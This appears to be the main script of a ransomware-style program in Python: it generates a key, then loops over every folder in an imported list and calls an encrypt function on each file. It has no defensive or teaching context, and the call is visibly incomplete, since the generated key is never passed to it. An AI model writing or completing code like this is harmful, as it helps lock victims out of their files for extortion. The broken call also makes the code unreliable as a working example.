import os
import foldersList
import encryptionKeyGenerator
import encrypter

if __name__ == "__main__":
    SECURE_KEY = encryptionKeyGenerator.key_generator(18)

    for folder in foldersList.folders:
        files = os.listdir(folder)
        for file in files:
            encrypter.encrypt(folder + "/" + file, )
